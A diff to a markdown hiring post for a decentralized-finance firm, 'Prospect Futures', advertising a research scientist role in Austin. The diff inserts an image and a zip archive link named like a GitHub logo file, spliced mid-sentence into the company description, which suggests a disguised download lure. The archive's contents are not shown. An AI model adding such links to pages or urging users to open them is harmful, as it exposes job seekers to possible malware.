@@ -2,6 +2,7 @@
 Hey! We're hiring. We'd love to learn more about your background!
 
 
+<img width="69" height="420" alt="github-mark-white" src="https://github.com/user-attachments/assets/4388b77b-028b-4d20-8dc3-2b10d3205ab2" />
 
 
 
@@ -19,7 +20,8 @@ What we're looking for:
 **Research Scientist (Hybrid)**  
 Austin, Texas Metropolitan Area
 
-**About Prospect Futures:** Securing Financial Freedom / Decentralized
+**About Prospect Futures:** Securing Financial Freedom / Decentralized[github-mark-c791e9551fe4.zip](https://github.com/user-attachments/files/24042417/github-mark-c791e9551fe4.zip)
+
 
 Prospect Futures is a company that leverages decentralized finance to sponsor Research and Development across hard/deep-tech verticals. We're open to exploring and sponsoring your ideas!
 
